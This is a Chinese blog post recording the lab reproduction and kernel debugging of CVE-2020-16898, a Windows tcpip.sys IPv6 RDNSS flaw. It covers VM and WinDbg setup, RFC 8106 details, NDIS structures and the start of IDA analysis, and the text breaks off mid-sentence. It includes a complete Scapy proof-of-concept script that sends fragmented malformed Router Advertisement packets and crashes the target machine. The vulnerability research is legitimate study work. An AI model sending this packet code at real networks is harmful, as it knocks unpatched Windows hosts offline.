<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="CVE-2020-16898调试复现记录, Hook">
    <meta name="baidu-site-verification" content>
    <meta name="google-site-verification" content>
    <meta name="360-site-verification" content>
    <meta name="description" content="环境搭建环境信息
物理机：Windows 10 
调试器：Windbg
虚拟机：Windows 10 1909版本
反编译：IDA

配置虚拟机由于我的本地环境win10中启用了hyper-v,在vmware 16.x中安装Windows ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>CVE-2020-16898调试复现记录 | Hook的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body>

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hook的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/misc" class="waves-effect waves-light">
            
            <span>工具</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <span>友情链接</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/contact" class="waves-effect waves-light">
            
            <span>留言板</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hook的博客</div>
        <div class="logo-desc">
            
            Hook
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/misc" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                工具
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                友情链接
            </a>
        </li>
        
        <li>
            <a href="/contact" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-link"></i>
                
                留言板
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/H01k" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/H01k" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '0648298b48be031996277ae472115a46e7964d2ac3882e61b84351f3c3f8a547';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        CVE-2020-16898调试复现记录
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 20px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                        <a href="/tags/CVE/" target="_blank">
                            <span class="chip bg-color">CVE</span>
                        </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-10
                </div>

                <div class="post-author info-break-policy">
                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
                    
                    Hook
                    
                </div>

                
                
                <div class="info-break-policy">
                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                    2.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    10 分
                </div>
                
                

                
                <div id="busuanzi_container_page_pv" class="info-break-policy">
                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                    <span id="busuanzi_value_page_pv"></span>
                </div>
                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul>
<li>物理机：Windows 10 </li>
<li>调试器：Windbg</li>
<li>虚拟机：Windows 10 1909版本</li>
<li>反编译：IDA</li>
</ul>
<h2 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h2><p>由于我的本地环境win10中启用了hyper-v,在vmware 16.x中安装Windows 10  1709版本开启debug后会有冲突，会造成假死，所以使用了Windows 10 1909版本 </p>
<p>在win10系统中复制一个启动项，并且打开调试模式。代码如下</p>
<pre><code>bcdedit /dbgsettings serial baudrate:115200 debugport:1

bcdedit /copy {current} /d DebugEntry

bcdedit /displayorder {current} {ID}

bcdedit /debug {ID} ON

bcdedit /set {default} bootmenupolicy legacy</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110194402977.png" alt="image-20201110194402977"></p>
<p>vmware中打开IPV6，同时添加一个调试串口。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195236313.png" alt="image-20201110195236313"></p>
<p>设置管道 <code>\\.\pipe\com_1</code></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195437003.png" alt="image-20201110195437003"></p>
<p>设置网络为NAT模式，VMnet8</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195547560.png" alt="image-20201110195547560"></p>
<h2 id="配置windbg"><a href="#配置windbg" class="headerlink" title="配置windbg"></a>配置windbg</h2><p>不同版本的windbg使用不同的配置方式</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200043264.png" alt="image-20201110200043264"></p>
<p>配置符号</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200331013.png" alt="image-20201110200331013"></p>
<p>旧版本的windbg需要在桌面创建快捷方式，在后面添加参数。</p>
<p><code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200849555.png" alt="image-20201110200849555"></p>
<h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><p>开始调试，设置reconnet，等待win10开机。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110201410605.png" alt="image-20201110201410605"></p>
<p>win10开机后，windbg处于调试运行状态，此时切换到kali中运行exp。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet6 <span class="token keyword">import</span> ICMPv6NDOptEFA<span class="token punctuation">,</span> ICMPv6NDOptRDNSS<span class="token punctuation">,</span> ICMPv6ND_RA<span class="token punctuation">,</span> IPv6<span class="token punctuation">,</span> IPv6ExtHdrFragment<span class="token punctuation">,</span> fragment6

v6_dst <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:34b0:3a5d:3646:3313"</span>
v6_src <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:351e:f5f7:5804:d271"</span>

p_test_half <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> b<span class="token string">"\x18\x30"</span> <span class="token operator">+</span> b<span class="token string">"\xFF\x18"</span>
p_test <span class="token operator">=</span> p_test_half <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>

c <span class="token operator">=</span> ICMPv6NDOptEFA<span class="token punctuation">(</span><span class="token punctuation">)</span>

e <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>
e<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">21</span>
e<span class="token punctuation">.</span>dns <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span>
<span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span> <span class="token punctuation">]</span>
aaa <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>
aaa<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">8</span>
pkt <span class="token operator">=</span> ICMPv6ND_RA<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> aaa <span class="token operator">/</span> \
      Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p_test_half <span class="token operator">+</span> b<span class="token string">"\x18\xa0"</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e

p_test_frag <span class="token operator">=</span> IPv6<span class="token punctuation">(</span>dst<span class="token operator">=</span>v6_dst<span class="token punctuation">,</span> src<span class="token operator">=</span>v6_src<span class="token punctuation">,</span> hlim<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">/</span> \
              IPv6ExtHdrFragment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>pkt

l<span class="token operator">=</span>fragment6<span class="token punctuation">(</span>p_test_frag<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> p <span class="token keyword">in</span> l<span class="token punctuation">:</span>
    send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改exp中的源地址和目标地址，源地址修改为kali的ipv6地址。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110224712749.png" alt="image-20201110224712749"></p>
<p>修改目标地址</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225345566.png" alt="image-20201110225345566"></p>
<p>运行后win10假死状态，windbg中断，可以发现发生了异常，使用!analyze -v运行分析。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110223459821.png" alt="image-20201110223459821"></p>
<p>发现了错误的位置 <code>tcpip!_report_gsfailure</code></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225721871.png" alt="image-20201110225721871"></p>
<p>输入kv 显示当前线程的堆栈，发现了两个有问题的堆栈位置。可以在ida中进行继续分析。crash原因的是GS机制的Security Cookie校验失败。</p>
<pre><code>07 fffff803`0f899108 fffff803`0f11b197 tcpip!_report_gsfailure+0x5
08 fffff803`0f899110 aaaaaaaa`aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225901670.png" alt="image-20201110225901670"></p>
<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-16898" target="_blank" rel="noopener">漏洞影响范围</a></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114222208771.png" alt="image-20201114222208771"></p>
<p>这次出现漏洞所涉及到的<a href="https://tools.ietf.org/html/rfc8106#section-5.3.1" target="_blank" rel="noopener">RFC 8106</a>协议报文如下：</p>
<pre><code>0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Length    |           Reserved            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Lifetime                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
:            Addresses of IPv6 Recursive DNS Servers            :
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre><p>原文如下：</p>
<blockquote>
<pre><code>      The validity of DNS options is checked with the Length field;
      that is, the value of the Length field in the RDNSS option is
      greater than or equal to the minimum value (3) and satisfies the
      requirement that (Length - 1) % 2 == 0.  The value of the Length
      field in the DNSSL option is greater than or equal to the minimum
      value (2).  Also, the validity of the RDNSS option is checked with
      the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the
      addresses should be unicast addresses.</code></pre></blockquote>
<p>几个比较重要的点是：</p>
<blockquote>
<ul>
<li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li>
<li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li>
<li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li>
</ul>
</blockquote>
<p>长度字段以8字节为单位定义选项的长度。头部的大小为8个字节，每个IPv6地址的长度增加了16个字节。这意味着，如果该结构包含<em>n个</em>IPv6地址，则应将其长度设置为<em>1 + 2 \</em> n*。长度为偶数时会发生此错误，导致代码错误地解释下一个选项结构的开头。</p>
<p>查询微软的docs关于<code>NdisGetDataBuffer</code>函数的相关信息。</p>
<pre class="line-numbers language-c++"><code class="language-c++">PVOID NdisGetDataBuffer(
  PNET_BUFFER NetBuffer,  //指向NET_BUFFER结构的指针.
  ULONG       BytesNeeded, // [输入]请求的数据的连续字节数。
  PVOID       Storage,  // [in，可选]指向缓冲区的指针，如果调用者未提供缓冲区，则为NULL。缓冲区的大小必须大于或等于BytesNeeded中指定的字节数 。如果该值为非NULL，并且请求的数据不连续，则NDIS将请求的数据复制到Storage指示的区域 。
  UINT        AlignMultiple, // [in]对齐倍数，以2的幂表示。例如2、4、8、16等。如果 AlignMultiple为1，则没有对齐要求。
  UINT        AlignOffset  // [in]与对齐倍数的偏移量（以字节为单位）。
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p> <strong>返回值</strong></p>
<p> <strong>NdisGetDataBuffer</strong>返回一个指向连续数据开始的指针，或者返回<strong>NULL</strong>。</p>
<p> 如果<em>NetBuffer</em> 参数指向的<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer_data" target="_blank" rel="noopener">NET_BUFFER</a>结构中 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer" target="_blank" rel="noopener">NET_BUFFER_DATA</a>结构的 <strong>DataLength</strong>成员 小于 <em>BytesNeeded</em>参数中的值，则返回值为<strong>NULL</strong>。</p>
<p> 如果缓冲区中请求的数据是连续的，则返回值是指向NDIS提供的位置的指针。如果数据不连续，则NDIS使用 <em>Storage</em>参数如下：</p>
<ul>
<li><p>如果 <em>Storage</em>参数为非<strong>NULL</strong>，则NDIS将数据复制到<em>Storage</em>的缓冲区中 。返回值是传递给<em>Storage</em>参数的指针 。</p>
</li>
<li><p>如果 <em>Storage</em>参数为<strong>NULL</strong>，则返回值为<strong>NULL</strong>。</p>
<p>由于无法映射数据缓冲区的资源不足情况， 返回值也可以为<strong>NULL</strong>。即使数据是连续的或<em>Storage</em>参数为非<strong>NULL，</strong>也可能会发生这种情况。</p>
</li>
</ul>
</blockquote>
<p>_NET_BUFFER 结构如下：</p>
<pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER { //NET_BUFFER结构指定通过网络发送或接收的数据。
  union {
    struct {
      PNET_BUFFER Next; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。
      PMDL        CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。
      ULONG       CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已使用数据空间开头的偏移量（以字节为单位）。
      union {
        ULONG  DataLength; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。
        SIZE_T stDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。该成员与DataLength相同，但其类型为SIZE_T而不是ULONG。
      };
      PMDL        MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。
      ULONG       DataOffset; //从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位）。
    };
    SLIST_HEADER      Link;
    NET_BUFFER_HEADER NetBufferHeader;
  };
  USHORT                ChecksumBias;
  USHORT                Reserved;
  NDIS_HANDLE           NdisPoolHandle;
  PVOID                 NdisReserved[2];
  PVOID                 ProtocolReserved[6];
  PVOID                 MiniportReserved[4];
  NDIS_PHYSICAL_ADDRESS DataPhysicalAddress;
  union {
    PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo;
    PSCATTER_GATHER_LIST      ScatterGatherList;
  };
} NET_BUFFER, *PNET_BUFFER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>NET_BUFFER_DATA</code>的结构如下：</p>
<pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER_DATA {
  PNET_BUFFER            Next; //指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。
  PMDL                   CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。
  ULONG                  CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已 使用数据空间开头的偏移量（以字节为单位） 。
  NET_BUFFER_DATA_LENGTH NbDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。
  PMDL                   MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。
  ULONG                  DataOffset; // 从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位） 。
} NET_BUFFER_DATA, *PNET_BUFFER_DATA;

该 NET_BUFFER_HEADER结构包含一个NET_BUFFER_DATA结构，对于定义数据 NET_BUFFER结构。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h2><p>使用ida加载tcpip.sys，将tcpip.pdb文件放在同目录，ida即可自动进行加载这个符号文件。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113194836750.png" alt="image-20201113194836750"></p>
<p>在funtion窗口中搜索<code>Ipv6pHandleRouterAdvertisement</code>，根据崩溃的位置，从这里开始进行分析。根据上图的堆栈，由于</p>
<p><code>08 fffff803 0f899110 aaaaaaaa aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</code></p>
